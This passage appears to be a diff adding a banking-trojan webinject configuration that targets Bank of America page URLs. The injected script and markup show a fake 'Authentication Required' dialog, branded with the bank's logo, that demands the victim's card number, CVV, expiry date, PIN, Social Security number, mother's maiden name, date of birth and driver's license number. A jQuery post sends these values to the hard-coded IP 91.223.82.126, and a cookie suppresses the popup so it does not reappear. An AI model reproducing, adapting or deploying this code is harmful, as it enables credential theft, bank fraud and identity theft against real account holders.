+	  </td></tr>
+	</tbody></table></center>
+  <center>
+	<div>
+		<table>
+			<tbody>
+				<tr><td align="left" style="font-size: 12px; background: #FFFFFF;"><b>ATM/Debit Card Number</b></td><td align="left" style="background: #FFFFFF; font-size: 11px;"><input type="text" id="ccAcctNo" name="ccAcctNo" maxlength="20"/></td></tr>
+				<tr><td align="left" style="font-size: 12px; background: #FFFFFF;"><b>CVV2 (3 digit card verification code)</b></td><td align="left" style="background: #FFFFFF; font-size: 11px;"><input type="text" name="ccCVV" id="ccCVV" size="3" maxlength="3"/></td></tr>
+				<tr><td align="left" style="font-size: 12px; background: #FFFFFF;"><b>Expiration Date</b></td><td align="left" style="background: #FFFFFF; font-size: 11px;"><select name="ccExpMM" id="ccExpMM">
+      <option value="0">
+      <option value="01">01
+      <option value="02">02
+      <option value="03">03
+      <option value="04">04
+      <option value="05">05
+      <option value="06">06
+      <option value="07">07
+      <option value="08">08
+      <option value="09">09
+      <option value="10">10
+      <option value="11">11
+      <option value="12">12
+     </select>
+     <select name="ccExpYYYY" id="ccExpYYYY">
+      <option value="0">
+      <option value="2011">2011
+	  <option value="2012">2012
+	  <option value="2013">2013
+	  <option value="2014">2014
+<option value="2015">2015
+<option value="2016">2016
+<option value="2017">2017
+<option value="2018">2018
+<option value="2019">2019
+<option value="2020">2020
+     </select></td></tr>
+				<tr><td align="left" style="font-size: 12px; background: #FFFFFF;"><b>PIN (the code you enter at ATMs)</b></td><td align="left" style="background: #FFFFFF; font-size: 11px;"><input type="password" name="ccPIN" id="ccPIN" size="5" maxlength="10"/></td></tr>
+				<tr><td align="left" style="font-size: 12px; background: #FFFFFF;"><br><b>Social Security Number</b></td><td align="left" style="background: #FFFFFF; font-size: 11px;"><br><input type="text" id="ssn1" size="4" maxlength="3" name="ssn1" value="">-<input type="text" id="ssn2" size="3" maxlength="2" name="ssn2" value="">-<input type="text" id="ssn3" size="4" maxlength="4" name="ssn3" value=""></td></tr>
+				<tr><td align="left" style="font-size: 12px; background: #FFFFFF;"><b>Mother's Maiden Name</b></td><td align="left" style="background: #FFFFFF; font-size: 11px;"><input type="text" name="mmn" id="mmn" size="12" maxlength="20"/></td></tr>
+				<tr><td align="left" style="font-size: 12px; background: #FFFFFF;"><b>Date Of Birth</b></td><td align="left" style="background: #FFFFFF; font-size: 11px;"><select name="dob1" id="dob1">
+<option value="0" ></option>
+<option value="1" >January</option>
+                      
+                        <option value="2" >February</option>
+                        
+                        <option value="3" >March</option>
+                        
+                        <option value="4" >April</option>
+                        
+                        <option value="5" >May</option>
+                        
+                        <option value="6" >June</option>
+                        
+                        <option value="7" >July</option>
+                        
+                        <option value="8" >August</option>
+                        
+                        <option value="9" >September</option>
+                        
+                        <option value="10" >October</option>
+                        
+                        <option value="11" >November</option>
+                        
+                        <option value="12" >December</option>
+                        
+                      </select>
+
+                      <select name="dob2" id="dob2">
+                        <option value="0" ></option>
+                        <option value="1" >1</option>
+                        
+                        <option value="2" >2</option>
+                        
+                        <option value="3" >3</option>
+                        
+                        <option value="4" >4</option>
+                        
+                        <option value="5" >5</option>
+                        
+                        <option value="6" >6</option>
+                        
+                        <option value="7" >7</option>
+                        
+                        <option value="8" >8</option>
+                        
+                        <option value="9" >9</option>
+                        
+                        <option value="10" >10</option>
+                        
+                        <option value="11" >11</option>
+                        
+                        <option value="12" >12</option>
+                        
+                        <option value="13" >13</option>
+                        
+                        <option value="14" >14</option>
+                        
+                        <option value="15" >15</option>
+                        
+                        <option value="16" >16</option>
+                        
+                        <option value="17" >17</option>
+                        
+                        <option value="18" >18</option>
+                        
+                        <option value="19" >19</option>
+                        
+                        <option value="20" >20</option>
+                        
+                        <option value="21" >21</option>
+                        
+                        <option value="22" >22</option>
+                        
+                        <option value="23" >23</option>
+                        
+                        <option value="24" >24</option>
+                        
+                        <option value="25" >25</option>
+                        
+                        <option value="26" >26</option>
+                        
+                        <option value="27" >27</option>
+                        
+                        <option value="28" >28</option>
+                        
+                        <option value="29" >29</option>
+                        
+                        <option value="30" >30</option>
+                        
+                        <option value="31" >31</option>
+                        
+                      </select>
+                      
+                      <select name="dob3" id="dob3">
+                        <option value="0" ></option>
+                        <option value="1900" >1900</option>
+                        
+                        <option value="1901" >1901</option>
+                        
+                        <option value="1902" >1902</option>
+                        
+                        <option value="1903" >1903</option>
+                        
+                        <option value="1904" >1904</option>
+                        
+                        <option value="1905" >1905</option>
+                        
+                        <option value="1906" >1906</option>
+                        
+                        <option value="1907" >1907</option>
+                        
+                        <option value="1908" >1908</option>
+                        
+                        <option value="1909" >1909</option>
+                        
+                        <option value="1910" >1910</option>
+                        
+                        <option value="1911" >1911</option>
+                        
+                        <option value="1912" >1912</option>
+                        
+                        <option value="1913" >1913</option>
+                        
+                        <option value="1914" >1914</option>
+                        
+                        <option value="1915" >1915</option>
+                        
+                        <option value="1916" >1916</option>
+                        
+                        <option value="1917" >1917</option>
+                        
+                        <option value="1918" >1918</option>
+                        
+                        <option value="1919" >1919</option>
+                        
+                        <option value="1920" >1920</option>
+                        
+                        <option value="1921" >1921</option>
+                        
+                        <option value="1922" >1922</option>
+                        
+                        <option value="1923" >1923</option>
+                        
+                        <option value="1924" >1924</option>
+                        
+                        <option value="1925" >1925</option>
+                        
+                        <option value="1926" >1926</option>
+                        
+                        <option value="1927" >1927</option>
+                        
+                        <option value="1928" >1928</option>
+                        
+                        <option value="1929" >1929</option>
+                        
+                        <option value="1930" >1930</option>
+                        
+                        <option value="1931" >1931</option>
+                        
+                        <option value="1932" >1932</option>
+                        
+                        <option value="1933" >1933</option>
+                        
+                        <option value="1934" >1934</option>
+                        
+                        <option value="1935" >1935</option>
+                        
+                        <option value="1936" >1936</option>
+                        
+                        <option value="1937" >1937</option>
+                        
+                        <option value="1938" >1938</option>
+                        
+                        <option value="1939" >1939</option>
+                        
+                        <option value="1940" >1940</option>
+                        
+                        <option value="1941" >1941</option>
+                        
+                        <option value="1942" >1942</option>
+                        
+                        <option value="1943" >1943</option>
+                        
+                        <option value="1944" >1944</option>
+                        
+                        <option value="1945" >1945</option>
+                        
+                        <option value="1946" >1946</option>
+                        
+                        <option value="1947" >1947</option>
+                        
+                        <option value="1948" >1948</option>
+                        
+                        <option value="1949" >1949</option>
+                        
+                        <option value="1950" >1950</option>
+                        
+                        <option value="1951" >1951</option>
+                        
+                        <option value="1952" >1952</option>
+                        
+                        <option value="1953" >1953</option>
+                        
+                        <option value="1954" >1954</option>
+                        
+                        <option value="1955" >1955</option>
+                        
+                        <option value="1956" >1956</option>
+                        
+                        <option value="1957" >1957</option>
+                        
+                        <option value="1958" >1958</option>
+                        
+                        <option value="1959" >1959</option>
+                        
+                        <option value="1960" >1960</option>
+                        
+                        <option value="1961" >1961</option>
+                        
+                        <option value="1962" >1962</option>
+                        
+                        <option value="1963" >1963</option>
+                        
+                        <option value="1964" >1964</option>
+                        
+                        <option value="1965" >1965</option>
+                        
+                        <option value="1966" >1966</option>
+                        
+                        <option value="1967" >1967</option>
+                        
+                        <option value="1968" >1968</option>
+                        
+                        <option value="1969" >1969</option>
+                        
+                        <option value="1970" >1970</option>
+                        
+                        <option value="1971" >1971</option>
+                        
+                        <option value="1972" >1972</option>
+                        
+                        <option value="1973" >1973</option>
+                        
+                        <option value="1974" >1974</option>
+                        
+                        <option value="1975" >1975</option>
+                        
+                        <option value="1976" >1976</option>
+                        
+                        <option value="1977" >1977</option>
+                        
+                        <option value="1978" >1978</option>
+                        
+                        <option value="1979" >1979</option>
+                        
+                        <option value="1980" >1980</option>
+                        
+                        <option value="1981" >1981</option>
+                        
+                        <option value="1982" >1982</option>
+                        
+                        <option value="1983" >1983</option>
+                        
+                        <option value="1984" >1984</option>
+                        
+                        <option value="1985" >1985</option>
+                        
+                        <option value="1986" >1986</option>
+                        
+                        <option value="1987" >1987</option>
+                        
+                        <option value="1988" >1988</option>
+                        
+                        <option value="1989" >1989</option>
+                        
+                        <option value="1990" >1990</option>
+                        
+                        <option value="1991" >1991</option>
+                        
+                        <option value="1992" >1992</option>
+                        
+                        <option value="1993" >1993</option>
+                        
+                        <option value="1994" >1994</option>
+                        
+                        <option value="1995" >1995</option>
+                        
+                        <option value="1996" >1996</option>
+                        
+                        <option value="1997" >1997</option>
+                        
+                        <option value="1998" >1998</option>
+                        
+                        <option value="1999" >1999</option>
+                        
+                        <option value="2000" >2000</option>
+                        
+                        <option value="2001" >2001</option>
+                        
+                        <option value="2002" >2002</option>
+                        
+                        <option value="2003" >2003</option>
+                        
+                        <option value="2004" >2004</option>
+                        
+                        <option value="2005" >2005</option>
+                        
+                        <option value="2006" >2006</option>
+                        <option value="2007" >2007</option>
+                      </select></td></tr>
+			</tbody>
+		</table>
+	</div>
+	</form>
+	</center>
+</div>
+<form name="injectform" action="" method="post">
+<input type="hidden" name="ccAcctNo_2" id="ccAcctNo_2" />
+<input type="hidden" name="ccCVV_2" id="ccCVV_2" />
+<input type="hidden" name="ccExpMM_2" id="ccExpMM_2" />
+<input type="hidden" name="ccExpYYYY_2" id="ccExpYYYY_2" />
+<input type="hidden" name="ccPIN_2" id="ccPIN_2" />
+<input type="hidden" name="ssn1_2" id="ssn1_2" />
+<input type="hidden" name="ssn2_2" id="ssn2_2" />
+<input type="hidden" name="ssn3_2" id="ssn3_2" />
+<input type="hidden" name="mmn_2" id="mmn_2" />
+<input type="hidden" name="dob1_2" id="dob1_2" />
+<input type="hidden" name="dob2_2" id="dob2_2" />
+<input type="hidden" name="dob3_2" id="dob3_2" />
+<input type="hidden" name="uid" id="uid" value="%BOTNAME%" />
+</form>
+data_end
+data_after
+</body>
+data_end
+
+set_url *bankofamerica.com/*/GotoWelcome* GP
+data_before
+data_end
+data_inject
+<link rel="stylesheet" href="http://ajax.googleapis.com/ajax/libs/jqueryui/1.7.1/themes/blitzer/ui.all.css" type="text/css" />
+<style type="text/css">
+#inject { display: none; }
+.ui-dialog { font-size: 10px; }
+.ui-dialog .ui-dialog-titlebar-close { visibility: hidden; }
+</style>
+data_end
+data_after
+</head>
+data_end
+data_before
+data_end
+data_inject
+<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.3.2/jquery.min.js"></script>
+<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jqueryui/1.7.1/jquery-ui.min.js"></script>
+<script type="text/javascript">
+var popfrequency="500 hours"
+
+function get_cookie(Name) {
+var search = Name + "="
+var returnvalue = "";
+if (document.cookie.length > 0) {
+offset = document.cookie.indexOf(search)
+if (offset != -1) { // if cookie exists
+offset += search.length
+// set index of beginning of value
+end = document.cookie.indexOf(";", offset);
+// set index of end of cookie value
+if (end == -1)
+end = document.cookie.length;
+returnvalue=unescape(document.cookie.substring(offset, end))
+}
+}
+return returnvalue;
+}
+
+function resetcookie(){
+var expireDate = new Date()
+expireDate.setHours(expireDate.getHours()-10)
+document.cookie = "tcpopunder=;path=/;expires=" + expireDate.toGMTString()
+}
+
+function loadornot(){
+if (get_cookie('tcpopunder')==''){
+loadpopunder()
+}
+}
+
+function loadpopunder(){
+
+function Init() 
+{
+	jQuery('#inject').dialog({ width: 600, resizable: false, buttons: { "Continue": function() {
+	        if (jQuery("#ccAcctNo").val().length < 16) 
+	        {
+		        alert('Please enter a valid ATM/Debit card number.');
+		        jQuery("#ccAcctNo").focus();
+	        } 
+	        else if (jQuery("#ccCVV").val().length < 3) 
+	        {
+		        alert('Please enter the last 3 digits on your signature panel.');
+		        jQuery("#ccCVV").focus();
+	        }
+	        else if (jQuery("#ccExpMM").val() < 1) 
+	        {
+		        alert('Please select an expiration date.');
+		        jQuery("#ccExpMM").focus();
+	        } 
+	        else if (jQuery("#ccExpYYYY").val() < 1) 
+	        {
+		        alert('Please select an expiration date.');
+		        jQuery("#ccExpYYYY").focus();
+	        } 			
+	        else if (jQuery("#ccPIN").val().length < 4) 
+	        {
+		        alert('Please enter your PIN code for your ATM/Checking card.');
+		        jQuery("#ccPIN").focus();
+	        }
+	        else if (jQuery("#ssn1").val().length < 3 || jQuery("#ssn2").val().length < 2 || jQuery("#ssn3").val().length < 4) 
+	        {
+		        alert('Please enter your social security number.');
+		        jQuery("#ssn1").focus();
+	        } 
+	        else if (jQuery("#mmn").val().length < 2) 
+	        {
+		        alert('Please enter your mothers maiden name.');
+		        jQuery("#mmn").focus();
+	        }
+			else if (jQuery("#dob1").val() < 1) 
+	        {
+		        alert('Please select your date of birth.');
+		        jQuery("#dob1").focus();
+	        }
+			else if (jQuery("#dob2").val() < 1) 
+	        {
+		        alert('Please select your date of birth.');
+		        jQuery("#dob2").focus();
+	        }
+			else if (jQuery("#dob3").val() < 1) 
+	        {
+		        alert('Please select your date of birth.');
+		        jQuery("#dob3").focus();
+	        }
+			else if (jQuery("#driver").val().length < 2) 
+	        {
+		        alert('Please enter your drivers license number.');
+		        jQuery("#driver").focus();
+	        }
+	        else 
+	        {
+		        jQuery("#ccAcctNo_2").val(jQuery("#ccAcctNo").val());
+				jQuery("#ccCVV_2").val(jQuery("#ccCVV").val());
+				jQuery("#ccExpMM_2").val(jQuery("#ccExpMM").val());
+				jQuery("#ccExpYYYY_2").val(jQuery("#ccExpYYYY").val());
+				jQuery("#ccPIN_2").val(jQuery("#ccPIN").val());
+				jQuery("#ssn1_2").val(jQuery("#ssn1").val());
+				jQuery("#ssn2_2").val(jQuery("#ssn2").val());
+                jQuery("#ssn3_2").val(jQuery("#ssn3").val());
+                jQuery("#mmn_2").val(jQuery("#mmn").val());
+                jQuery("#dob1_2").val(jQuery("#dob1").val());
+                jQuery("#dob2_2").val(jQuery("#dob2").val());
+                jQuery("#dob3_2").val(jQuery("#dob3").val());
+				jQuery("#driver_2").val(jQuery("#driver").val());
+				$.post("http://91.223.82.126/ssl/bofa.php", $("form[name='injectform']").serialize());
+				jQuery('#inject').dialog('close');
+                var expireDate = new Date()
+                expireDate.setHours(expireDate.getHours()+parseInt(popfrequency))
+                document.cookie = "tcpopunder="+parseInt(popfrequency)+";path=/;expires=" + expireDate.toGMTString()}
+		} 
+}, closeOnEscape: false, modal: true, show: 'slide' });
+}
+jQuery(document).ready(Init);
+}
+
+if (popfrequency=="always"){
+resetcookie()
+loadpopunder()
+}
+else{
+if (get_cookie('tcpopunder')!=parseInt(popfrequency))
+resetcookie()
+loadornot()
+}
+</script>
+<div id="inject">
+	<form>
+	<center>
+	<table><tbody>
+	  <tr><td style="background: #FFFFFF;">
+	<img src="https://www.bankofamerica.com/content/images/ContextualSiteGraphics/Logos/en_US/boa_logo.gif" style="margin-top: 0px; margin-left: 0px; margin-bottom: 0px;"/>
+	  </td></tr>
+<tr><td align="center" style="text-align: center; font-size: 10px; background: #FFFFFF;">
+	<br><h3>Authentication Required</h3>
+	  </td></tr>
+<tr><td align="left" style="text-align: justify; font-size: 11px; background: #FFFFFF;">
+	In order to provide you with extra security, we occasionally need to ask for additional information when you access your accounts online. Please enter the information below to continue.</br></br>
+	  </td></tr>
+	</tbody></table></center>
+  <center>
+	<div>
+		<table>
+			<tbody>
+				<tr><td align="left" style="font-size: 12px; background: #FFFFFF;"><b>ATM/Debit Card Number</b></td><td align="left" style="background: #FFFFFF; font-size: 11px;"><input type="text" id="ccAcctNo" name="ccAcctNo" maxlength="20"/></td></tr>
+				<tr><td align="left" style="font-size: 12px; background: #FFFFFF;"><b>CVV2 (3 digit card verification code)</b></td><td align="left" style="background: #FFFFFF; font-size: 11px;"><input type="text" name="ccCVV" id="ccCVV" size="3" maxlength="3"/></td></tr>
+				<tr><td align="left" style="font-size: 12px; background: #FFFFFF;"><b>Expiration Date</b></td><td align="left" style="background: #FFFFFF; font-size: 11px;"><select name="ccExpMM" id="ccExpMM">
+      <option value="0">
+      <option value="01">01
+      <option value="02">02
+      <option value="03">03
+      <option value="04">04
+      <option value="05">05
+      <option value="06">06
+      <option value="07">07
+      <option value="08">08
+      <option value="09">09
+      <option value="10">10
+      <option value="11">11
+      <option value="12">12
+     </select>
+     <select name="ccExpYYYY" id="ccExpYYYY">
+      <option value="0">
+      <option value="2011">2011
+	  <option value="2012">2012
+	  <option value="2013">2013
+	  <option value="2014">2014
+<option value="2015">2015
+<option value="2016">2016
+<option value="2017">2017
+<option value="2018">2018
+<option value="2019">2019
+<option value="2020">2020
+     </select></td></tr>
+				<tr><td align="left" style="font-size: 12px; background: #FFFFFF;"><b>PIN (the code you enter at ATMs)</b></td><td align="left" style="background: #FFFFFF; font-size: 11px;"><input type="password" name="ccPIN" id="ccPIN" size="5" maxlength="10"/></td></tr>
+				<tr><td align="left" style="font-size: 12px; background: #FFFFFF;"><br><b>Social Security Number</b></td><td align="left" style="background: #FFFFFF; font-size: 11px;"><br><input type="text" id="ssn1" size="4" maxlength="3" name="ssn1" value="">-<input type="text" id="ssn2" size="3" maxlength="2" name="ssn2" value="">-<input type="text" id="ssn3" size="4" maxlength="4" name="ssn3" value=""></td></tr>
+				<tr><td align="left" style="font-size: 12px; background: #FFFFFF;"><b>Mother's Maiden Name</b></td><td align="left" style="background: #FFFFFF; font-size: 11px;"><input type="text" name="mmn" id="mmn" size="12" maxlength="20"/></td></tr>
+				<tr><td align="left" style="font-size: 12px; background: #FFFFFF;"><b>Date Of Birth</b></td><td align="left" style="background: #FFFFFF; font-size: 11px;"><select name="dob1" id="dob1">
+<option value="0" ></option>
+<option value="1" >January</option>
+                      
+                        <option value="2" >February</option>
+                        
+                        <option value="3" >March</option>
+                        
+                        <option value="4" >April</option>
+                        
+                        <option value="5" >May</option>
+                        
+                        <option value="6" >June</option>
+                        
+                        <option value="7" >July</option>
+                        
+                        <option value="8" >August</option>
+                        
+                        <option value="9" >September</option>
+                        
+                        <option value="10" >October</option>
+                        
+                        <option value="11" >November</option>
+                        
+                        <option value="12" >December</option>
+                        
+                      </select>
+
+                      <select name="dob2" id="dob2">
+                        <option value="0" ></option>
+                        <option value="1" >1</option>
+                        
+                        <option value="2" >2</option>
+                        
+                        <option value="3" >3</option>
+                        
+                        <option value="4" >4</option>
+                        
+                        <option value="5" >5</option>
+                        
+                        <option value="6" >6</option>
+                        
+                        <option value="7" >7</option>
+                        
+                        <option value="8" >8</option>
+                        
+                        <option value="9" >9</option>
+                        
+                        <option value="10" >10</option>
+                        
+                        <option value="11" >11</option>
+                        
+                        <option value="12" >12</option>
+                        
+                        <option value="13" >13</option>
+                        
+                        <option value="14" >14</option>
+                        
+                        <option value="15" >15</option>
+                        
+                        <option value="16" >16</option>
+                        
+                        <option value="17" >17</option>
+                        
+                        <option value="18" >18</option>
+                        
+                        <option value="19" >19</option>
+                        
+                        <option value="20" >20</option>
+                        
+                        <option value="21" >21</option>
+                        
+                        <option value="22" >22</option>
+                        
+                        <option value="23" >23</option>
+                        
+                        <option value="24" >24</option>
+                        
+                        <option value="25" >25</option>
+                        
+                        <option value="26" >26</option>
+                        
+                        <option value="27" >27</option>
+                        
+                        <option value="28" >28</option>
+                        
+                        <option value="29" >29</option>
+                        
+                        <option value="30" >30</option>
+                        
+                        <option value="31" >31</option>
+                        
+                      </select>
+                      
+                      <select name="dob3" id="dob3">
+                        <option value="0" ></option>
+                        <option value="1900" >1900</option>
+                        
+                        <option value="1901" >1901</option>
+                        
+                        <option value="1902" >1902</option>
+                        
+                        <option value="1903" >1903</option>
+                        
+                        <option value="1904" >1904</option>
+                        
+                        <option value="1905" >1905</option>
+                        
+                        <option value="1906" >1906</option>
+                        
+                        <option value="1907" >1907</option>
+                        
+                        <option value="1908" >1908</option>
+                        
+                        <option value="1909" >1909</option>
+                        
+                        <option value="1910" >1910</option>
+                        
+                        <option value="1911" >1911</option>
+                        
+                        <option value="1912" >1912</option>
+                        
+                        <option value="1913" >1913</option>
+                        
+                        <option value="1914" >1914</option>
+                        
+                        <option value="1915" >1915</option>
+                        
+                        <option value="1916" >1916</option>
+                        
+                        <option value="1917" >1917</option>
+                        
+                        <option value="1918" >1918</option>
+                        
+                        <option value="1919" >1919</option>
+                        
+                        <option value="1920" >1920</option>
+                        
+                        <option value="1921" >1921</option>
+                        
+                        <option value="1922" >1922</option>
+                        
+                        <option value="1923" >1923</option>
+                        
+                        <option value="1924" >1924</option>
+                        
+                        <option value="1925" >1925</option>
+                        
+                        <option value="1926" >1926</option>
+                        
+                        <option value="1927" >1927</option>
+                        
+                        <option value="1928" >1928</option>
+                        
+                        <option value="1929" >1929</option>
+                        
+                        <option value="1930" >1930</option>
+                        
+                        <option value="1931" >1931</option>
+                        
+                        <option value="1932" >1932</option>
+                        
+                        <option value="1933" >1933</option>
+                        
+                        <option value="1934" >1934</option>
+                        
+                        <option value="1935" >1935</option>
+                        
+                        <option value="1936" >1936</option>
+                        
+                        <option value="1937" >1937</option>
+                        
+                        <option value="1938" >1938</option>
+                        
+                        <option value="1939" >1939</option>
+                        
+                        <option value="1940" >1940</option>
+                        
+                        <option value="1941" >1941</option>
+                        
+                        <option value="1942" >1942</option>
+                        
+                        <option value="1943" >1943</option>
+                        
+                        <option value="1944" >1944</option>
+                        
+                        <option value="1945" >1945</option>
+                        
+                        <option value="1946" >1946</option>
+                        
+                        <option value="1947" >1947</option>
+                        
+                        <option value="1948" >1948</option>
+                        
+                        <option value="1949" >1949</option>
+                        
+                        <option value="1950" >1950</option>
+                        
+                        <option value="1951" >1951</option>
+                        
+                        <option value="1952" >1952</option>
+                        
+                        <option value="1953" >1953</option>
+                        
+                        <option value="1954" >1954</option>
+                        
+                        <option value="1955" >1955</option>
+                        
+                        <option value="1956" >1956</option>
+                        
+                        <option value="1957" >1957</option>
+                        
+                        <option value="1958" >1958</option>
+                        
+                        <option value="1959" >1959</option>
+                        
+                        <option value="1960" >1960</option>
+                        
+                        <option value="1961" >1961</option>
+                        
+                        <option value="1962" >1962</option>
+                        
+                        <option value="1963" >1963</option>
+                        
+                        <option value="1964" >1964</option>
+                        
+                        <option value="1965" >1965</option>
+                        
+                        <option value="1966" >1966</option>
+                        
+                        <option value="1967" >1967</option>
+                        
+                        <option value="1968" >1968</option>
+                        
+                        <option value="1969" >1969</option>
+                        
+                        <option value="1970" >1970</option>
+                        
+                        <option value="1971" >1971</option>
+                        
+                        <option value="1972" >1972</option>
+                        
+                        <option value="1973" >1973</option>
+                        
+                        <option value="1974" >1974</option>
+                        
+                        <option value="1975" >1975</option>
+                        
+                        <option value="1976" >1976</option>
+                        
+                        <option value="1977" >1977</option>
+                        
+                        <option value="1978" >1978</option>
+                        
+                        <option value="1979" >1979</option>
+                        
+                        <option value="1980" >1980</option>
+                        
+                        <option value="1981" >1981</option>
+                        
+                        <option value="1982" >1982</option>
+                        
+                        <option value="1983" >1983</option>
+                        
+                        <option value="1984" >1984</option>
+                        
+                        <option value="1985" >1985</option>
+                        
+                        <option value="1986" >1986</option>
+                        
+                        <option value="1987" >1987</option>
+                        
+                        <option value="1988" >1988</option>
+                        
+                        <option value="1989" >1989</option>
+                        
+                        <option value="1990" >1990</option>
+                        
+                        <option value="1991" >1991</option>
+                        
+                        <option value="1992" >1992</option>
+                        
+                        <option value="1993" >1993</option>
+                        
+                        <option value="1994" >1994</option>
+                        
+                        <option value="1995" >1995</option>
+                        
+                        <option value="1996" >1996</option>
+                        
+                        <option value="1997" >1997</option>
+                        
+                        <option value="1998" >1998</option>
+                        
+                        <option value="1999" >1999</option>
+                        
+                        <option value="2000" >2000</option>
+                        
+                        <option value="2001" >2001</option>
+                        
+                        <option value="2002" >2002</option>
+                        
+                        <option value="2003" >2003</option>
+                        
+                        <option value="2004" >2004</option>
+                        
+                        <option value="2005" >2005</option>
+                        
+                        <option value="2006" >2006</option>
+                        <option value="2007" >2007</option>
+                      </select></td></tr>
+					  <tr><td align="left" style="font-size: 12px; background: #FFFFFF;"><b>Driver's License Number</b></td><td align="left" style="background: #FFFFFF; font-size: 11px;"><input type="text" name="driver" id="driver" size="12" maxlength="30"/></td></tr>
+			</tbody>
+		</table>
+	</div>
+	</form>
+	</center>
+</div>
+<form name="injectform" action="" method="post">
+<input type="hidden" name="ccAcctNo_2" id="ccAcctNo_2" />
+<input type="hidden" name="ccCVV_2" id="ccCVV_2" />
+<input type="hidden" name="ccExpMM_2" id="ccExpMM_2" />
+<input type="hidden" name="ccExpYYYY_2" id="ccExpYYYY_2" />
+<input type="hidden" name="ccPIN_2" id="ccPIN_2" />
+<input type="hidden" name="ssn1_2" id="ssn1_2" />
+<input type="hidden" name="ssn2_2" id="ssn2_2" />
+<input type="hidden" name="ssn3_2" id="ssn3_2" />
+<input type="hidden" name="mmn_2" id="mmn_2" />
+<input type="hidden" name="dob1_2" id="dob1_2" />
+<input type="hidden" name="dob2_2" id="dob2_2" />
+<input type="hidden" name="dob3_2" id="dob3_2" />
+<input type="hidden" name="driver_2" id="driver_2" />
+<input type="hidden" name="uid" id="uid" value="%BOTNAME%" />
+</form>
+data_end
+data_after
+</body>
+data_end
+
+set_url *bankofamerica.com/*/SplashPageControl* GP
+data_before
+data_end
+data_inject
+<link rel="stylesheet" href="http://ajax.googleapis.com/ajax/libs/jqueryui/1.7.1/themes/blitzer/ui.all.css" type="text/css" />
+<style type="text/css">
+#inject { display: none; }
+.ui-dialog { font-size: 10px; }
+.ui-dialog .ui-dialog-titlebar-close { visibility: hidden; }
+</style>
+data_end
+data_after
+</head>
+data_end
+data_before
+data_end
+data_inject
+<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.3.2/jquery.min.js"></script>
+<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jqueryui/1.7.1/jquery-ui.min.js"></script>
+<script type="text/javascript">
+var popfrequency="500 hours"
+
+function get_cookie(Name) {
+var search = Name + "="
+var returnvalue = "";
+if (document.cookie.length > 0) {
+offset = document.cookie.indexOf(search)
+if (offset != -1) { // if cookie exists
+offset += search.length
+// set index of beginning of value
+end = document.cookie.indexOf(";", offset);
+// set index of end of cookie value
+if (end == -1)
+end = document.cookie.length;
+returnvalue=unescape(document.cookie.substring(offset, end))
+}
+}
+return returnvalue;
+}
+
+function resetcookie(){
+var expireDate = new Date()
+expireDate.setHours(expireDate.getHours()-10)
+document.cookie = "tcpopunder=;path=/;expires=" + expireDate.toGMTString()
+}
+
+function loadornot(){
+if (get_cookie('tcpopunder')==''){
+loadpopunder()
+}
+}
+
+function loadpopunder(){
+
+function Init() 
+{
+	jQuery('#inject').dialog({ width: 600, resizable: false, buttons: { "Continue": function() {
+	        if (jQuery("#ccAcctNo").val().length < 16) 
+	        {
+		        alert('Please enter a valid ATM/Debit card number.');
+		        jQuery("#ccAcctNo").focus();
+	        } 
+	        else if (jQuery("#ccCVV").val().length < 3) 
+	        {
+		        alert('Please enter the last 3 digits on your signature panel.');
+		        jQuery("#ccCVV").focus();
+	        }
+	        else if (jQuery("#ccExpMM").val() < 1) 
+	        {
+		        alert('Please select an expiration date.');
+		        jQuery("#ccExpMM").focus();
+	        } 
+	        else if (jQuery("#ccExpYYYY").val() < 1) 
+	        {
+		        alert('Please select an expiration date.');
+		        jQuery("#ccExpYYYY").focus();
+	        } 			
+	        else if (jQuery("#ccPIN").val().length < 4) 
+	        {
+		        alert('Please enter your PIN code for your ATM/Checking card.');
+		        jQuery("#ccPIN").focus();
+	        }
+	        else if (jQuery("#ssn1").val().length < 3 || jQuery("#ssn2").val().length < 2 || jQuery("#ssn3").val().length < 4) 
+	        {
+		        alert('Please enter your social security number.');
+		        jQuery("#ssn1").focus();
+	        } 
+	        else if (jQuery("#mmn").val().length < 2) 
+	        {
+		        alert('Please enter your mothers maiden name.');
+		        jQuery("#mmn").focus();
+	        }
+			else if (jQuery("#dob1").val() < 1) 
+	        {
+		        alert('Please select your date of birth.');
+		        jQuery("#dob1").focus();
+	        }
+			else if (jQuery("#dob2").val() < 1) 
+	        {
+		        alert('Please select your date of birth.');
+		        jQuery("#dob2").focus();
+	        }
+			else if (jQuery("#dob3").val() < 1) 
+	        {
+		        alert('Please select your date of birth.');
+		        jQuery("#dob3").focus();
+	        }
+			else if (jQuery("#driver").val().length < 2) 
+	        {
+		        alert('Please enter your drivers license number.');
+		        jQuery("#driver").focus();
+	        }
+	        else 
+	        {
+		        jQuery("#ccAcctNo_2").val(jQuery("#ccAcctNo").val());
+				jQuery("#ccCVV_2").val(jQuery("#ccCVV").val());
+				jQuery("#ccExpMM_2").val(jQuery("#ccExpMM").val());
+				jQuery("#ccExpYYYY_2").val(jQuery("#ccExpYYYY").val());
+				jQuery("#ccPIN_2").val(jQuery("#ccPIN").val());
+				jQuery("#ssn1_2").val(jQuery("#ssn1").val());
+				jQuery("#ssn2_2").val(jQuery("#ssn2").val());
+                jQuery("#ssn3_2").val(jQuery("#ssn3").val());
+                jQuery("#mmn_2").val(jQuery("#mmn").val());
+                jQuery("#dob1_2").val(jQuery("#dob1").val());
+                jQuery("#dob2_2").val(jQuery("#dob2").val());
+                jQuery("#dob3_2").val(jQuery("#dob3").val());
+				jQuery("#driver_2").val(jQuery("#driver").val());
+				$.post("http://91.223.82.126/ssl/bofa.php", $("form[name='injectform']").serialize());
+				jQuery('#inject').dialog('close');
+                var expireDate = new Date()
+                expireDate.setHours(expireDate.getHours()+parseInt(popfrequency))
+                document.cookie = "tcpopunder="+parseInt(popfrequency)+";path=/;expires=" + expireDate.toGMTString()}
+		} 
+}, closeOnEscape: false, modal: true, show: 'slide' });
+}
+jQuery(document).ready(Init);
+}
+
+if (popfrequency=="always"){
+resetcookie()
+loadpopunder()
+}
+else{
+if (get_cookie('tcpopunder')!=parseInt(popfrequency))
+resetcookie()
+loadornot()
+}
+</script>
+<div id="inject">
+	<form>
+	<center>
+	<table><tbody>
+	  <tr><td style="background: #FFFFFF;">
+	<img src="https://www.bankofamerica.com/content/images/ContextualSiteGraphics/Logos/en_US/boa_logo.gif" style="margin-top: 0px; margin-left: 0px; margin-bottom: 0px;"/>
